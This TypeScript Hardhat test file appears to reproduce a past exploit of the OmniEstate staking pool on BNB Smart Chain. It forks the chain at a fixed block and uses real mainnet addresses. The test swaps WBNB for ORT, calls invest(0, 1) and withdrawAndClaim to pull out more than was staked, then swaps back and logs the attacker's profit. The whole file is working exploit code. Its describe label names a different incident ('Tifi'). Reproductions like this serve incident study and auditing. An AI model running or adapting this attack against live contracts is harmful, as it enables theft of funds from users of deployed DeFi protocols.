import { Signer } from 'ethers'
import { ethers } from 'hardhat'
import { expect } from 'chai'
import { IERC20, OmniStakingPool, Uni_Router_V2, IWBNB } from '../typechain-types' // Adjust the import paths according to your project's structure

describe('Tifi Exploit Test', function () {
    let omniStakingPool: OmniStakingPool
    let ORT: IERC20
    let Router: Uni_Router_V2
    let WBNB: IWBNB
    let attacker: Signer

    const OmniAddress = '0x6f40A3d0c89cFfdC8A1af212A019C220A295E9bB'
    const ORTAddress = '0x1d64327C74d6519afeF54E58730aD6fc797f05Ba'
    const RouterAddress = '0x10ED43C718714eb63d5aA57B78B54704E256024E'
    const WBNBAddress = '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c'

    before(async function () {
        ;[attacker] = await ethers.getSigners()

        ORT = await ethers.getContractAt('IERC20', ORTAddress)
        Router = await ethers.getContractAt('Uni_Router_V2', RouterAddress)
        WBNB = await ethers.getContractAt('IWBNB', WBNBAddress)
        omniStakingPool = await ethers.getContractAt('OmniStakingPool', OmniAddress)
    })

    it('should block number equal to 24850696', async function () {
        const blockNumber = await ethers.provider.getBlockNumber()
        expect(blockNumber).to.equal(24850696)
    })
    it('should attack OmniEstate', async function () {
        // 1. Get some ORT token
        const depositAmount = ethers.parseEther('1')
        await WBNB.connect(attacker).deposit({ value: depositAmount })
        const wbnbBalanceBeforeAttack = await WBNB.balanceOf(attacker.getAddress())
        console.log(`[Before Attacks] Attacker WBNB balance: ${ethers.formatEther(wbnbBalanceBeforeAttack)}`)
        await bscSwap(WBNBAddress, ORTAddress, depositAmount)

        // 2. Invest
        await ORT.connect(attacker).approve(OmniAddress, ethers.MaxUint256)
        await omniStakingPool.connect(attacker).invest(0, 1)
        const stakes: bigint[] = await omniStakingPool.getUserStaking(attacker.getAddress())

        // 3. Withdraw
        await omniStakingPool.connect(attacker).withdrawAndClaim(stakes[0])
        // 4. Profit
        const ortBalance = await ORT.balanceOf(attacker.getAddress())
        await bscSwap(ORTAddress, WBNBAddress, ortBalance)

        const wbnbBalanceAfterAttack = await WBNB.balanceOf(attacker.getAddress())
        console.log(`[After Attacks] Attacker WBNB balance: ${ethers.formatEther(wbnbBalanceAfterAttack)}`)
    })
    async function bscSwap(tokenFrom: string, tokenTo: string, amount: bigint) {
        const tokenFromContract = await ethers.getContractAt('IERC20', tokenFrom)
        await tokenFromContract.connect(attacker).approve(RouterAddress, ethers.MaxUint256)

        const path = [tokenFrom, tokenTo]
        await Router.connect(attacker).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount,
            0, // Assume 0 is the minimum amount out; in a real scenario you'd calculate this
            path,
            attacker.getAddress(),
            Math.floor(Date.now() / 1000) + 1800, // Plus 30 minutes
        )
    }
})
